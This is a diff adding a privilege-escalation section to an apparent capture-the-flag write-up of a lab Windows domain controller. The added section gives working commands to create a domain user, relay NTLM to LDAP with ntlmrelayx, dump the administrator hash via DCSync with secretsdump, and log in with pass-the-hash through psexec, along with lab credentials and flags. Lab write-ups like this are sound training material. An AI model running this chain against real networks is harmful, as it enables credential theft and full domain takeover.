@@ -45,3 +45,34 @@ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 With that we gained initial access and found the user flag on the desktop
 
 user flag: 3d6a7c6a450f8c07b30261ca85b42ca0
+
+Privledge Escalation:
+
+We know that Account Operators can add new users so we will attempt to add a new user:
+
+```
+net user bigb0ss bigb0ss /add /domain
+
+net group "Exchange Trusted Subsystem" bigb0ss /add /domain
+```
+we use ntlmrelayx.py to set up a mitm and catch an attempt to login with the new user
+
+```
+python3 ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user bigb0ss
+```
+
+Then we do a random auth with the account on our local machine which failes on our machine but successfully escalates privledges on the victims machine.
+```
+python3 psexec.py htb.local/bigb0ss:bigb0ss@10.10.16.7
+```
+we then use DCSync to dump the hashes with another tool called secretsdump.py 
+```
+python3 secretsdump.py htb.local/bigb0ss:bigb0ss@10.10.10.161 -just-dc-user administrator
+```
+Finally we gain root access using PSexec
+```
+psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+```
+root flag: 1345e723085e50f3605e575ad4f41fbe
+
+system has been rooted action is no longer required.
